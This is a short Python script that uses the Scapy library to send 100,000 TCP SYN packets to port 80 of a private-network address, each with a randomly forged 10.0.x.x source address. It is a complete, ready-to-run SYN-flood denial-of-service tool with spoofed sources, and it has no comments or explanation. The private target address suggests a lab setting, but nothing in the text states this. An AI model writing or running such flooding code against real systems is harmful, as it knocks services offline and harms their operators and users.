from scapy.all import sendp, Ether, IP, TCP
import random

target_ip = "192.168.85.1"
iface = r"\Device\NPF_{02231860-CD13-47AB-9975-C66676B8ACE5}"

for i in range(100000):
    src_ip = f"10.0.{random.randint(0,255)}.{random.randint(0,255)}"
    pkt = Ether()/IP(src=src_ip, dst=target_ip)/TCP(dport=80, flags="S")
    sendp(pkt, iface=iface, verbose=0)